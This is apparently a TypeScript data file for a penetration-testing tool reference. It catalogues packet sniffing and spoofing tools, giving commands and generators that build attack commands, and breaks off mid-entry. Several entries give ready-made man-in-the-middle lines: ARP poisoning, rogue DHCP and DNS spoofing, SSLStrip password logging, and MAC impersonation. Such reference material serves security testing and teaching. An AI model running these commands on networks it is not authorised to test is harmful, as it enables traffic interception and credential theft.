import type { Tool } from '../toolTypes';

export const sniffingSpoofingTools: Tool[] = [
  {
    id: 'wireshark',
    name: 'Wireshark',
    description: 'The world\'s foremost network protocol analyzer and the de facto standard across many industries. Allows deep microscopic inspection of hundreds of protocols in real-time or offline. Features a powerful GUI with advanced filtering, stream reassembly, and decryption capabilities.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['network', 'packet-analysis', 'protocols', 'gui', 'pcap'],
    commands: [
      { command: 'wireshark', description: 'Launch the Wireshark GUI natively' },
      { command: 'tshark -i eth0 -w capture.pcap', description: 'Command-line capture: listen on eth0 and write raw packets to a file' },
      { command: 'wireshark -r capture.pcap', description: 'Open and analyze a previously saved packet capture file' },
      { command: 'tshark -Y "http.request.method == POST" -r capture.pcap', description: 'Filter and extract only HTTP POST requests from a capture file via CLI' },
      { command: 'tshark -i eth0 -T fields -e http.host -e http.user_agent', description: 'Extract and print specific protocol fields (Host and User-Agent) live' },
    ],
    whenToUse: [
      'For deep, granular packet inspection of captured network traffic',
      'To troubleshoot complex network routing, latency, or dropped packet issues',
      'For extracting cleartext credentials, files, or analyzing malware communication (C2 traffic)',
      'To rebuild and read entire TCP streams (e.g., following an HTTP or Telnet session)',
    ],
    commonFlags: [
      { flag: '-i', description: 'Specify the network interface to listen on (tshark)' },
      { flag: '-w', description: 'Write raw packet data to an output file (tshark)' },
      { flag: '-r', description: 'Read packet data from an existing pcap file' },
      { flag: '-Y', description: 'Apply a display filter (e.g., "tcp.port==80")' },
      { flag: '-f', description: 'Apply a BPF capture filter at the driver level' },
    ],
    relatedTools: ['tshark', 'tcpdump', 'tcpflow'],
    installation: 'sudo apt install wireshark tshark -y',
    website: 'https://www.wireshark.org',
    interactiveCommands: [
      {
        name: 'Wireshark/TShark Capture Configurator',
        description: 'Configure and generate CLI packet capture or GUI launch commands.',
        inputs: [
          { id: 'mode', label: 'Launch Mode', type: 'select', options: ['tshark (CLI Capture)', 'wireshark (GUI)'], defaultValue: 'tshark (CLI Capture)' },
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, wlan0' },
          { id: 'writeFile', label: 'Write to PCAP (-w)', type: 'text', defaultValue: 'capture.pcap', placeholder: 'Filename to save' },
          { id: 'readFile', label: 'Read PCAP (-r)', type: 'text', defaultValue: '', placeholder: 'Filename to read' },
          { id: 'displayFilter', label: 'Display Filter (-Y)', type: 'text', defaultValue: '', placeholder: 'e.g., http.request.method == POST' },
          { id: 'bpfFilter', label: 'Capture Filter (-f)', type: 'text', defaultValue: '', placeholder: 'e.g., tcp port 80' },
          { id: 'fields', label: 'Extract Fields (-e)', type: 'text', defaultValue: '', placeholder: 'e.g., http.host (with -T fields)' }
        ],
        generator: (inputs) => {
          let cmd = inputs.mode === 'wireshark (GUI)' ? 'wireshark' : 'tshark';
          
          if (inputs.readFile) {
            cmd += ` -r ${inputs.readFile}`;
          } else if (inputs.interface) {
            cmd += ` -i ${inputs.interface}`;
          }
          
          if (inputs.writeFile && !inputs.readFile) cmd += ` -w ${inputs.writeFile}`;
          if (inputs.displayFilter) cmd += ` -Y "${inputs.displayFilter}"`;
          if (inputs.bpfFilter && !inputs.readFile) cmd += ` -f "${inputs.bpfFilter}"`;
          
          if (inputs.fields && inputs.mode === 'tshark (CLI Capture)') {
            cmd += ' -T fields';
            const splitFields = inputs.fields.split(',');
            for (const f of splitFields) {
              cmd += ` -e ${f.trim()}`;
            }
          }
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'tcpdump',
    name: 'TCPDump',
    description: 'The premier command-line packet analyzer. Extremely powerful and lightweight, it captures and displays packets directly from the network interface. Perfect for headless servers, SSH sessions, or environments where GUI tools like Wireshark are unavailable or too heavy.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['network', 'cli', 'packet-capture', 'lightweight', 'pcap'],
    commands: [
      { command: 'tcpdump -i eth0', description: 'Capture dynamically on interface eth0 (requires root)' },
      { command: 'tcpdump -i eth0 host 192.168.1.100', description: 'Filter rigidly to capture traffic only to/from a specific IP' },
      { command: 'tcpdump -i eth0 port 80', description: 'Filter specifically to capture only HTTP (port 80) traffic' },
      { command: 'tcpdump -i eth0 -w capture.pcap', description: 'Save capture actively to a standard PCAP file for Wireshark analysis' },
      { command: 'tcpdump -r capture.pcap', description: 'Read gracefully from an existing PCAP file' },
      { command: 'tcpdump -i eth0 \'tcp[tcpflags] & (tcp-syn) != 0\'', description: 'Advanced: Capture only TCP SYN packets (useful for spotting port scans)' },
      { command: 'tcpdump -i eth0 -A -s 0 port 80', description: 'Print the raw ASCII cleartext HTTP payload instantly to the terminal' },
    ],
    whenToUse: [
      'For command-line packet capture directly on headless servers or restricted environments',
      'When GUI tools like Wireshark are entirely unavailable natively',
      'For scripting automated network monitoring loops via bash',
      'For remote capture across SSH connections piping directly into local Wireshark',
    ],
    commonFlags: [
      { flag: '-i', description: 'Interface to listen on (e.g., eth0, any)' },
      { flag: '-w', description: 'Write raw packets to file instead of printing' },
      { flag: '-r', description: 'Read packets from file' },
      { flag: '-A', description: 'Print each packet in ASCII (great for cleartext protocols)' },
      { flag: '-n', description: 'Do not resolve IP addresses to hostnames (speeds up output)' },
      { flag: '-nn', description: 'Do not resolve IPs OR port numbers' },
      { flag: '-s 0', description: 'Snaplength: capture the entire packet (default truncates)' },
      { flag: '-v / -vv', description: 'Verbose output (prints more packet header details)' },
    ],
    relatedTools: ['wireshark', 'tshark', 'ngrep'],
    installation: 'sudo apt install tcpdump -y',
    website: 'https://www.tcpdump.org',
    interactiveCommands: [
      {
        name: 'TCPDump Capture Builder',
        description: 'Build precise packet capture commands with BPF filters, output options, and protocol selection.',
        inputs: [
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, wlan0, any' },
          { id: 'filterType', label: 'Filter Preset', type: 'select', options: ['None', 'Host IP', 'Port', 'Network (CIDR)', 'Protocol', 'Custom BPF'], defaultValue: 'None' },
          { id: 'filterValue', label: 'Filter Value', type: 'text', defaultValue: '', placeholder: 'IP, port number, net CIDR, or BPF expression' },
          { id: 'protocol', label: 'Protocol Filter', type: 'select', options: ['Any', 'tcp', 'udp', 'icmp', 'arp'], defaultValue: 'Any' },
          { id: 'writeFile', label: 'Write to File (-w)', type: 'text', defaultValue: '', placeholder: 'e.g., capture.pcap' },
          { id: 'count', label: 'Packet Count (-c)', type: 'text', defaultValue: '', placeholder: 'e.g., 100 (unlimited if empty)' },
          { id: 'verbose', label: 'Verbosity', type: 'select', options: ['Normal', '-v (Verbose)', '-vv (More Verbose)', '-vvv (Maximum)'], defaultValue: 'Normal' },
          { id: 'ascii', label: 'Print ASCII (-A)', type: 'checkbox', defaultValue: 'false', placeholder: 'Show packet payloads in ASCII' },
          { id: 'noResolve', label: 'No DNS Resolution (-nn)', type: 'checkbox', defaultValue: 'true', placeholder: 'Faster output, no lookups' }
        ],
        generator: (inputs) => {
          let filter = '';
          if (inputs.filterType === 'Host IP' && inputs.filterValue) filter = ` host ${inputs.filterValue}`;
          else if (inputs.filterType === 'Port' && inputs.filterValue) filter = ` port ${inputs.filterValue}`;
          else if (inputs.filterType === 'Network (CIDR)' && inputs.filterValue) filter = ` net ${inputs.filterValue}`;
          else if (inputs.filterType === 'Custom BPF' && inputs.filterValue) filter = ` '${inputs.filterValue}'`;
          const proto = inputs.protocol !== 'Any' ? ` ${inputs.protocol}` : '';
          const writeFile = inputs.writeFile ? ` -w ${inputs.writeFile}` : '';
          const count = inputs.count ? ` -c ${inputs.count}` : '';
          const verbose = inputs.verbose !== 'Normal' ? ` ${inputs.verbose.split(' ')[0]}` : '';
          const ascii = inputs.ascii === 'true' ? ' -A -s 0' : '';
          const noResolve = inputs.noResolve === 'true' ? ' -nn' : '';
          return `tcpdump -i ${inputs.interface}${noResolve}${verbose}${ascii}${count}${writeFile}${proto}${filter}`;
        }
      }
    ]
  },
  {
    id: 'ettercap',
    name: 'Ettercap',
    description: 'A comprehensive, legacy suite for Man-In-The-Middle (MITM) attacks. Features sniffing of live connections, content filtering on the fly, and active/passive dissection of many protocols. Supports active spoofing (ARP, DHCP, DNS) and can inject custom data into established connections.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['mitm', 'arp-spoofing', 'sniffing', 'interception'],
    commands: [
      { command: 'ettercap -G', description: 'Launch the GTK GUI mode for visual attack management' },
      { command: 'ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//', description: 'Execute targeted text-mode ARP spoofing attack between router and host' },
      { command: 'ettercap -T -i eth0 -M dhcp:192.168.1.200-254/255.255.255.0/192.168.1.1', description: 'Execute active rogue DHCP spoofing natively' },
      { command: 'ettercap -T -q -i eth0 -P dns_spoof -M arp /192.168.1.100// ///', description: 'Execute ARP poisoning combined with DNS spoofing quietly' },
    ],
    whenToUse: [
      'For launching reliable man-in-the-middle attacks across local LANs',
      'To actively intercept and extract cleartext passwords (FTP, HTTP, Telnet, POP3)',
      'To inject custom packets, modify HTML payloads, or drop connections using integrated plugins',
    ],
    commonFlags: [
      { flag: '-T', description: 'Text-only interface (CLI mode)' },
      { flag: '-G', description: 'Graphical interface mode' },
      { flag: '-i', description: 'Interface to use' },
      { flag: '-M', description: 'MITM attack method (e.g., arp, dhcp, port, icmp)' },
      { flag: '-P', description: 'Load a specific plugin (e.g., dns_spoof)' },
      { flag: '-q', description: 'Quiet mode — do not display packet contents' },
    ],
    relatedTools: ['bettercap', 'arpspoof', 'mitmf'],
    installation: 'sudo apt install ettercap-graphical -y',
    website: 'https://www.ettercap-project.org',
    interactiveCommands: [
      {
        name: 'Ettercap MITM Attack Builder',
        description: 'Configure ARP/DHCP/DNS poisoning attacks with plugin loading and target selection.',
        inputs: [
          { id: 'mode', label: 'Interface Mode', type: 'select', options: ['Text Mode (-T)', 'GTK GUI (-G)'], defaultValue: 'Text Mode (-T)' },
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, wlan0' },
          { id: 'attackType', label: 'MITM Attack (-M)', type: 'select', options: ['arp:remote (ARP Poisoning)', 'dhcp (DHCP Spoofing)', 'icmp (ICMP Redirect)', 'None (Sniff Only)'], defaultValue: 'arp:remote (ARP Poisoning)' },
          { id: 'target1', label: 'Target 1 (Victim IP)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Victim IP' },
          { id: 'target2', label: 'Target 2 (Gateway IP)', type: 'text', defaultValue: '192.168.1.1', placeholder: 'Gateway or second target' },
          { id: 'plugin', label: 'Plugin (-P)', type: 'select', options: ['None', 'dns_spoof', 'autoadd', 'remote_browser', 'repoison_arp'], defaultValue: 'None' },
          { id: 'quiet', label: 'Quiet Mode (-q)', type: 'checkbox', defaultValue: 'true', placeholder: 'Suppress packet contents' }
        ],
        generator: (inputs) => {
          const mode = inputs.mode.includes('-T') ? '-T' : '-G';
          const attack = inputs.attackType !== 'None (Sniff Only)' ? ` -M ${inputs.attackType.split(' ')[0]}` : '';
          const t1 = `/${inputs.target1}//`;
          const t2 = `/${inputs.target2}//`;
          const plugin = inputs.plugin !== 'None' ? ` -P ${inputs.plugin}` : '';
          const quiet = inputs.quiet === 'true' ? ' -q' : '';
          return `ettercap ${mode}${quiet} -i ${inputs.interface}${attack} ${t1} ${t2}${plugin}`;
        }
      }
    ]
  },
  {
    id: 'scapy',
    name: 'Scapy',
    description: 'An incredibly powerful interactive packet manipulation program and Python library. It can forge, decode, send, and capture packets for a wide number of protocols. Used to build custom network tools, perform advanced network discovery, bypass firewalls, and execute targeted attacks natively.',
    category: 'sniffing-spoofing',
    difficulty: 'advanced',
    tags: ['packet-crafting', 'python', 'automation', 'flexible', 'framework'],
    commands: [
      { command: 'scapy', description: 'Launch the interactive Scapy Python shell' },
      { command: 'ans,unans = arping("192.168.1.0/24")', description: 'Execute an ARP ping sweep natively within the shell' },
      { command: 'pkt = IP(dst="192.168.1.100")/TCP(dport=80, flags="S")', description: 'Craft a custom TCP SYN packet targeting port 80' },
      { command: 'send(pkt)', description: 'Send the crafted packet immediately at Layer 3' },
      { command: 'sendp(Ether()/IP(dst="1.2.3.4")/ICMP(), iface="eth0")', description: 'Send a packet at Layer 2 specifying the interface' },
      { command: 'sniff(iface="eth0", prn=lambda x: x.summary(), filter="tcp port 80")', description: 'Actively sniff HTTP traffic and print a summary via Python' },
    ],
    whenToUse: [
      'For generating custom, malformed packets specifically designed to bypass IDSs/Firewalls',
      'To automate complex network probing, fuzzing, or attack tasks within Python scripts',
      'For rapid protocol penetration testing natively via the interactive REPL',
      'When standard tools (like Nmap or ping) lack the specific bit-level control you require',
    ],
    commonFlags: [
      { flag: 'ls()', description: 'List all supported protocol layers in the Scapy shell' },
      { flag: 'lsc()', description: 'List all available Scapy command functions' },
      { flag: 'send()', description: 'Send packets at Layer 3 (handles routing/MACs automatically)' },
      { flag: 'sendp()', description: 'Send packets at Layer 2 (requires Ethernet headers)' },
      { flag: 'sr()', description: 'Send packets and receive answers (Layer 3)' },
      { flag: 'sniff()', description: 'Capture packets dynamically' },
    ],
    relatedTools: ['hping3', 'nping', 'libpcap'],
    installation: 'pip install scapy   # or: sudo apt install python3-scapy -y',
    website: 'https://scapy.net',
    interactiveCommands: [
      {
        name: 'Scapy Interactive Shell',
        description: 'Generate specific Python statements to execute natively within the Scapy interactive shell.',
        inputs: [
          { id: 'action', label: 'Pre-built Action', type: 'select', options: ['Launch Shell', 'ARP Ping Sweep', 'Craft TCP SYN', 'Send Custom Packet', 'Sniff Traffic'], defaultValue: 'Launch Shell' },
          { id: 'interface', label: 'Interface', type: 'text', defaultValue: 'eth0', placeholder: 'For sending/sniffing' },
          { id: 'dstIp', label: 'Destination IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP or Range' },
          { id: 'dport', label: 'Destination Port', type: 'text', defaultValue: '80', placeholder: 'Target port' },
          { id: 'filter', label: 'Sniff Filter', type: 'text', defaultValue: 'tcp port 80', placeholder: 'BPF filter' },
          { id: 'count', label: 'Packet Count', type: 'text', defaultValue: '10', placeholder: 'How many to sniff' }
        ],
        generator: (inputs) => {
          if (inputs.action === 'Launch Shell') return 'scapy';
          if (inputs.action === 'ARP Ping Sweep') return `ans,unans = arping("${inputs.dstIp}/24")`;
          if (inputs.action === 'Craft TCP SYN') return `pkt = IP(dst="${inputs.dstIp}")/TCP(dport=${inputs.dport}, flags="S")`;
          if (inputs.action === 'Send Custom Packet') return `sendp(Ether()/IP(dst="${inputs.dstIp}")/ICMP(), iface="${inputs.interface}")`;
          if (inputs.action === 'Sniff Traffic') return `sniff(iface="${inputs.interface}", prn=lambda x: x.summary(), filter="${inputs.filter}", count=${inputs.count})`;
          return 'scapy';
        }
      }
    ]
  },
  {
    id: 'arpspoof',
    name: 'ArpSpoof',
    description: 'A dedicated, lightweight command-line tool from the dsniff suite used exclusively to redirect packets on a local network by transmitting forged ARP messages. The fastest way to establish a Man-In-The-Middle position between a target and the gateway.',
    category: 'sniffing-spoofing',
    difficulty: 'beginner',
    tags: ['mitm', 'arp', 'redirection', 'dsniff', 'spoofing'],
    commands: [
      { command: 'echo 1 > /proc/sys/net/ipv4/ip_forward', description: 'CRITICAL: Enable IP forwarding locally to route victim traffic instead of dropping it (DoS)' },
      { command: 'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1', description: 'Poison target: Tell the victim (100) that YOU are the gateway (1)' },
      { command: 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.100', description: 'Poison gateway: Tell the gateway (1) that YOU are the victim (100)' },
    ],
    whenToUse: [
      'When you need the absolute simplest, most reliable CLI tool for ARP poisoning without heavy frameworks',
      'As a foundational precursor to running capture tools like Wireshark, TCPDump, or SSLStrip',
      'To forcefully redirect local traffic immediately within internal IPv4 subnets',
    ],
    commonFlags: [
      { flag: '-i', description: 'Network interface to use (e.g., eth0)' },
      { flag: '-t', description: 'Target IP to poison (leave blank to poison ALL hosts on the LAN)' },
      { flag: '-r', description: 'Poison both target and host in a single command (bidirectional)' },
    ],
    relatedTools: ['ettercap', 'bettercap', 'dsniff'],
    installation: 'sudo apt install dsniff -y',
    website: 'https://github.com/ggreer/dsniff',
    interactiveCommands: [
      {
        name: 'ArpSpoof Poisoner',
        description: 'Configure and launch high-speed ARP spoofing attacks.',
        inputs: [
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, wlan0' },
          { id: 'target', label: 'Target IP (-t)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Victim IP (leave blank for all)' },
          { id: 'gateway', label: 'Host/Gateway IP', type: 'text', defaultValue: '192.168.1.1', placeholder: 'IP to impersonate' },
          { id: 'bidirectional', label: 'Bidirectional (-r)', type: 'checkbox', defaultValue: 'false', placeholder: 'Poison both directions' },
          { id: 'ipForward', label: 'Enable IP Forwarding', type: 'checkbox', defaultValue: 'true', placeholder: 'Crucial for MITM (prevents DoS)' },
          { id: 'c', label: 'Hardware Address (-c)', type: 'select', options: ['None', 'own', 'host', 'both'], defaultValue: 'None' }
        ],
        generator: (inputs) => {
          let cmd = '';
          if (inputs.ipForward === 'true') {
             cmd += 'echo 1 > /proc/sys/net/ipv4/ip_forward && ';
          }
          
          cmd += `arpspoof -i ${inputs.interface}`;
          
          if (inputs.target) cmd += ` -t ${inputs.target}`;
          if (inputs.bidirectional === 'true') cmd += ' -r';
          if (inputs.c !== 'None') cmd += ` -c ${inputs.c}`;
          
          cmd += ` ${inputs.gateway}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'mitmproxy',
    name: 'mitmproxy',
    description: 'An interactive, highly scriptable TLS-capable intercepting HTTP proxy. It allows penetration testers to intercept, inspect, modify, and replay web traffic (HTTP/1, HTTP/2, WebSockets). Features a terminal UI, a web GUI, and a powerful Python API for automated traffic modification.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['proxy', 'https', 'interception', 'web', 'python'],
    commands: [
      { command: 'mitmproxy', description: 'Start the interactive CLI console proxy (Listens on 127.0.0.1:8080)' },
      { command: 'mitmweb', description: 'Start the web-based graphical interface proxy locally' },
      { command: 'mitmdump -w traffic.out', description: 'Run silently in the background mapping all traffic to a local file' },
      { command: 'mitmproxy -s modify_requests.py', description: 'Load a custom Python addon script to dynamically modify payloads on the fly' },
      { command: 'mitmproxy --mode transparent', description: 'Run in transparent mode (used in conjunction with ARP spoofing)' },
    ],
    whenToUse: [
      'For analyzing and manipulating tightly secured mobile application API traffic directly',
      'To modify HTTP/HTTPS requests automatically purely via Python scripting',
      'As a vastly scriptable, lightweight terminal alternative strictly superior to Burp Suite for CLI purists',
      'When performing transparent proxying during MITM attacks on a LAN',
    ],
    commonFlags: [
      { flag: '-p', description: 'Specify the listening port (default is 8080)' },
      { flag: '-s', description: 'Execute a custom Python script against intercepted traffic' },
      { flag: '--mode', description: 'Operation mode (regular, transparent, reverse, socks5)' },
      { flag: '-w', description: 'Write traffic flow to a file' },
      { flag: '--set', description: 'Set arbitrary configuration options' },
    ],
    relatedTools: ['burpsuite', 'owasp-zap', 'fiddler'],
    installation: 'sudo apt install mitmproxy -y',
    website: 'https://mitmproxy.org/',
    interactiveCommands: [
      {
        name: 'mitmproxy Interception Configurator',
        description: 'Launch the mitmproxy interactive CLI, Web GUI, or headless dump mode.',
        inputs: [
          { id: 'app', label: 'Application Mode', type: 'select', options: ['mitmproxy (CLI)', 'mitmweb (Web GUI)', 'mitmdump (Headless)'], defaultValue: 'mitmproxy (CLI)' },
          { id: 'port', label: 'Listen Port (-p)', type: 'text', defaultValue: '8080', placeholder: 'Default is 8080' },
          { id: 'mode', label: 'Proxy Mode (--mode)', type: 'select', options: ['regular', 'transparent', 'reverse', 'socks5'], defaultValue: 'regular' },
          { id: 'script', label: 'Python Script (-s)', type: 'text', defaultValue: '', placeholder: 'Path to custom addon script' },
          { id: 'saveFile', label: 'Save Traffic (-w)', type: 'text', defaultValue: '', placeholder: 'Path to save intercept' },
          { id: 'showHost', label: 'Show Host (--showhost)', type: 'checkbox', defaultValue: 'false', placeholder: 'Use Host header for URLs' },
          { id: 'insecure', label: 'Insecure SSL (--insecure)', type: 'checkbox', defaultValue: 'false', placeholder: 'Do not verify upstream certs' }
        ],
        generator: (inputs) => {
          let cmd = inputs.app.split(' ')[0];
          
          if (inputs.port !== '8080') cmd += ` -p ${inputs.port}`;
          if (inputs.mode !== 'regular') cmd += ` --mode ${inputs.mode}`;
          if (inputs.script) cmd += ` -s ${inputs.script}`;
          if (inputs.saveFile) cmd += ` -w ${inputs.saveFile}`;
          if (inputs.showHost === 'true') cmd += ' --showhost';
          if (inputs.insecure === 'true') cmd += ' --insecure';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'sslstrip',
    name: 'SSLStrip',
    description: 'A tool that transparently hijacks HTTP traffic on a network, watching for HTTPS links and redirects, and dynamically downgrades them to look-alike HTTP links. This allows an attacker to intercept "secure" credentials in pure cleartext before they are encrypted.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['mitm', 'downgrade', 'https', 'hijacking', 'cleartext'],
    commands: [
      { command: 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080', description: 'CRITICAL: Configure iptables to route victim HTTP traffic natively into SSLStrip' },
      { command: 'sslstrip -l 8080', description: 'Listen natively for downgraded traffic on port 8080' },
      { command: 'sslstrip -a -w passwords.txt', description: 'Log all traffic and passwords observed via downgrade to a file' },
    ],
    whenToUse: [
      'To actively bypass HTTPS securely if HSTS (HTTP Strict Transport Security) is missing on the target site',
      'During internal penetration tests relying strictly on legacy network setups or misconfigured SSL/TLS',
      'To intercept secure credentials completely in cleartext by forcing the user to communicate via HTTP',
    ],
    commonFlags: [
      { flag: '-l', description: 'Port to listen on (must match the iptables REDIRECT rule)' },
      { flag: '-w', description: 'File to log intercepted data into' },
      { flag: '-a', description: 'Log all HTTP traffic, not just captured passwords' },
      { flag: '-f', description: 'Substitute a custom favicon on secure requests to simulate the "padlock" icon' },
    ],
    relatedTools: ['mitmproxy', 'bettercap', 'arpspoof'],
    installation: 'sudo apt install sslstrip -y',
    website: 'https://moxie.org/software/sslstrip/',
    interactiveCommands: [
      {
        name: 'SSLStrip Downgrade Setup',
        description: 'Configure iptables routing and launch SSLStrip for cleartext HTTPS interception.',
        inputs: [
          { id: 'port', label: 'Listen Port (-l)', type: 'text', defaultValue: '8080', placeholder: 'Port to listen on' },
          { id: 'logFile', label: 'Log File (-w)', type: 'text', defaultValue: 'sslstrip.log', placeholder: 'File to save traffic' },
          { id: 'logAll', label: 'Log All Traffic (-a)', type: 'checkbox', defaultValue: 'true', placeholder: 'Log entire HTTP payload' },
          { id: 'favicon', label: 'Fake Favicon (-f)', type: 'checkbox', defaultValue: 'false', placeholder: 'Show fake padlock icon' },
          { id: 'iptables', label: 'Auto-Configure iptables', type: 'checkbox', defaultValue: 'true', placeholder: 'Run iptables REDIRECT first' },
          { id: 'targetPort', label: 'Target HTTP Port', type: 'text', defaultValue: '80', placeholder: 'Usually 80' }
        ],
        generator: (inputs) => {
          let cmd = '';
          
          if (inputs.iptables === 'true') {
             cmd += `iptables -t nat -A PREROUTING -p tcp --destination-port ${inputs.targetPort} -j REDIRECT --to-port ${inputs.port} && `;
          }
          
          cmd += `sslstrip -l ${inputs.port}`;
          
          if (inputs.logFile) cmd += ` -w ${inputs.logFile}`;
          if (inputs.logAll === 'true') cmd += ' -a';
          if (inputs.favicon === 'true') cmd += ' -f';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'dnschef',
    name: 'DNSChef',
    description: 'A highly configurable DNS proxy for Penetration Testers. It acts as a rogue DNS server to fake responses for specific domains or all domains. Essential for malware analysis, establishing captive portals, or directing victims to malicious clones of legitimate websites.',
    category: 'sniffing-spoofing',
    difficulty: 'intermediate',
    tags: ['dns', 'proxy', 'spoofing', 'phishing', 'malware-analysis'],
    commands: [
      { command: 'dnschef --fakeip 192.168.1.50 --fakedomains example.com', description: 'Spoof specifically only example.com to point to your IP' },
      { command: 'dnschef --fakeip 192.168.1.50', description: 'Wildcard: resolve ALL domains natively to your IP directly (Captive Portal)' },
      { command: 'dnschef --file config.ini', description: 'Load massively complex DNS configurations (multiple IPs, domains, MX records)' },
      { command: 'dnschef --interface 0.0.0.0 --port 53', description: 'Listen on all interfaces strictly on the standard DNS port' },
    ],
    whenToUse: [
      'When evaluating malware domains natively within a highly controlled sandbox (sinkholing)',
      'During physical red-team operations conducting active Captive Portal phishing (Evil Twin)',
      'To poison internal corporate subnets dynamically, resolving legitimate tools/sites to your attack infrastructure',
    ],
    commonFlags: [
      { flag: '--fakeip', description: 'The IPv4 address to use for fake A record responses' },
      { flag: '--fakedomains', description: 'Comma-separated list of domains to spoof (supports wildcards)' },
      { flag: '--interface', description: 'The interface IP to listen on (default is 127.0.0.1)' },
      { flag: '--logfile', description: 'Log all DNS queries intercepted to a file' },
      { flag: '--file', description: 'INI config file for advanced multi-record spoofing (A, AAAA, MX, CNAME)' },
    ],
    relatedTools: ['bettercap', 'responder', 'dnsmasq'],
    installation: 'sudo apt install dnschef -y',
    website: 'https://github.com/iphelix/dnschef',
    interactiveCommands: [
      {
        name: 'DNSChef Rogue Proxy',
        description: 'Generate DNSChef commands to spoof DNS records for specific domains or wildcard routing.',
        inputs: [
          { id: 'interface', label: 'Listen Interface (--interface)', type: 'text', defaultValue: '0.0.0.0', placeholder: 'Listen on all IPs' },
          { id: 'port', label: 'Listen Port (--port)', type: 'text', defaultValue: '53', placeholder: 'Standard DNS is 53' },
          { id: 'fakeIp', label: 'Fake Target IP (--fakeip)', type: 'text', defaultValue: '192.168.1.50', placeholder: 'IP to redirect victims to' },
          { id: 'fakeDomains', label: 'Domains to Spoof (--fakedomains)', type: 'text', defaultValue: '', placeholder: 'e.g., example.com (leave empty for ALL)' },
          { id: 'configFile', label: 'INI Config (--file)', type: 'text', defaultValue: '', placeholder: 'Advanced multi-record config' },
          { id: 'logFile', label: 'Log File (--logfile)', type: 'text', defaultValue: '', placeholder: 'Save DNS queries' },
          { id: 'quiet', label: 'Quiet Mode (-q)', type: 'checkbox', defaultValue: 'false', placeholder: 'Less terminal noise' }
        ],
        generator: (inputs) => {
          let cmd = 'dnschef';
          
          if (inputs.interface !== '127.0.0.1') cmd += ` --interface ${inputs.interface}`;
          if (inputs.port !== '53') cmd += ` --port ${inputs.port}`;
          
          if (inputs.configFile) {
             cmd += ` --file ${inputs.configFile}`;
          } else {
             if (inputs.fakeIp) cmd += ` --fakeip ${inputs.fakeIp}`;
             if (inputs.fakeDomains) cmd += ` --fakedomains ${inputs.fakeDomains}`;
          }
          
          if (inputs.logFile) cmd += ` --logfile ${inputs.logFile}`;
          if (inputs.quiet === 'true') cmd += ' -q';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'macchanger',
    name: 'Macchanger',
    description: 'A simple but critical utility for manipulating the MAC address of network interfaces. Allows an operator to spoof their hardware address to bypass MAC filtering, evade tracking on public WiFi, or impersonate authorized devices on a restricted network.',
    category: 'sniffing-spoofing',
    difficulty: 'beginner',
    tags: ['mac', 'spoofing', 'evasion', 'stealth', 'hardware'],
    commands: [
      { command: 'ifconfig eth0 down', description: 'CRITICAL: You must bring the interface down before changing its MAC' },
      { command: 'macchanger -s eth0', description: 'Show the current MAC address actively' },
      { command: 'macchanger -r eth0', description: 'Set a completely fully random MAC address (best for anonymity)' },
      { command: 'macchanger -m AA:BB:CC:DD:EE:FF eth0', description: 'Set a specific targeted MAC manually (best for impersonation)' },
      { command: 'macchanger -p eth0', description: 'Restore the original permanent hardware MAC natively' },
      { command: 'ifconfig eth0 up', description: 'Bring the interface back up after manipulation' },
    ],
    whenToUse: [
      'To bypass purely MAC-based port security or rigid DHCP reservations locally (Captive Portals)',
      'For completely untraceable anonymity reliably when joining hotel or airport WiFi',
      'To persistently spoof the MAC of an existing authenticated device to steal its network access',
    ],
    commonFlags: [
      { flag: '-r', description: 'Generate a fully random MAC address' },
      { flag: '-e', description: 'Generate a random MAC but keep the vendor bytes the same (stealthier)' },
      { flag: '-m', description: 'Specify an exact MAC address manually' },
      { flag: '-p', description: 'Reset to the original permanent hardware MAC' },
      { flag: '-s', description: 'Show the current, permanent, and fake MAC statuses' },
    ],
    relatedTools: ['ifconfig', 'iproute2'],
    installation: 'sudo apt install macchanger -y',
    website: 'https://github.com/alobbs/macchanger',
    interactiveCommands: [
      {
        name: 'Macchanger Spoofing Utility',
        description: 'Generate safely bounded commands to bring down interfaces and alter hardware MAC addresses.',
        inputs: [
          { id: 'interface', label: 'Target Interface', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, wlan0' },
          { id: 'mode', label: 'Action Mode', type: 'select', options: ['Random MAC (-r)', 'Same Vendor Random (-e)', 'Specific MAC (-m)', 'Restore Original (-p)', 'Show Current (-s)'], defaultValue: 'Random MAC (-r)' },
          { id: 'specificMac', label: 'Specific MAC Address', type: 'text', defaultValue: 'AA:BB:CC:DD:EE:FF', placeholder: 'If using Specific MAC mode' },
          { id: 'autoToggle', label: 'Auto Interface Toggle', type: 'checkbox', defaultValue: 'true', placeholder: 'Automatically run ifconfig down/up' },
          { id: 'bia', label: 'Show BIA (-b)', type: 'checkbox', defaultValue: 'false', placeholder: 'Pretend to be burned-in-address' }
        ],
        generator: (inputs) => {
          let flag = '-r';
          if (inputs.mode.includes('-e')) flag = '-e';
          if (inputs.mode.includes('-p')) flag = '-p';
          if (inputs.mode.includes('-s')) flag = '-s';
          if (inputs.mode.includes('-m')) flag = `-m ${inputs.specificMac}`;
          
          const bia = inputs.bia === 'true' ? ' -b' : '';
          
